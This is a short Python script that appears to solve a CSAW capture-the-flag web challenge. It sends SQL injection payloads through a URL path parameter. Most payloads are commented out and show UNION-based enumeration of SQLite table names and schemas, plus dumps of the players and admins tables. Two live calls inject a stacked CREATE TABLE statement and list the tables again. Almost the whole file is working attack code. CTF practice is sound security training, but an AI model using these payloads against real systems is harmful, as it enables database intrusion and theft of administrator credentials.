import requests
import urllib.parse

TARGET_URL = 'http://web.chal.csaw.io:5006'

def inject(payload):
    #sql = urllib.parse.quote_plus(payload)
    sql = payload
    res = requests.get(f"{TARGET_URL}/players/{sql}-P")
    print(res.text)

def admin(user,pw):
    data = {
        "username":user,
        "password":pw
    }
#inject("1\' union select null,null,null,null;-- ")
#inject("1\' union select null,sqlite_version(),null,null;-- ")
#inject("1\' union select null,tbl_name,null,null FROM sqlite_master WHERE type='table';-- ")
#inject("1\' union select null,sql,null,null FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='admins';-- ")
#inject("1\' union select null,sql,null,null FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='players';-- ")
#inject("1\' union select null,first,last,specialty from players;-- ")
#inject("1\' union select *,null from admins;-- ")
inject("1\';CREATE TABLE pwn (dataz text);--")
inject("1\' union select null,tbl_name,null,null FROM sqlite_master WHERE type='table';-- ")